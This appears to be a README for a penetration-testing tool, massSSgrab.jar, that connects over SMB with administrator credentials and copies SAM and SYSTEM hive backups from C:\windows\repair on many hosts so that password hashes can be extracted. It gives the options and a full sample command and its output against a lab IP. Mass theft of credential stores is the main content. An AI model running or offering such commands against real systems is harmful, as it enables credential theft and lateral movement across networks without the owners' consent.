==========
Info
==========
This tool will use included jcifs library to grab copies of both system and sam files from "C:\windows\repair\" directory from multiple hosts. It might be useful for these corner cases where live capture of sam/system files is not possible but you would like to get historic hashes out of the system.

==========
Help
==========
The following options can be used:

--help - Display this help
--verbose - Be verbose
--h - Host List (like nmap -iL option)
--u - Username
--p - Password
--d - Domain
--o - Output Directory
--sam - name of the SAM file (default sam)
--system - name of the SYSTEM file (default system)

==========
Failed execution
==========

Will tell you that it either can't connect or can't find Sam/System file. 

==========
Succesful execution
==========

$ boom> java -jar massSSgrab.jar --h=/tmp/ips.txt --u=Administrator --p=Password1 --d=WORKSTATION --o=/tmp/SS --verbose --sam=sam --system=system
 [+] Verbose mode ON
         [+]Will grab SAM/System from : 192.168.56.101
         [+]Running mass SAM/System grab agains : 192.168.56.101
                 [+] 192.168.56.101 :
                         [+] SAM file exists
                         [+] System file exists
                         [+] SAM file saved in /tmp/SS/192.168.56.101/SAM_dump
                         [+] System file saved in /tmp/SS/192.168.56.101/System_dump
						 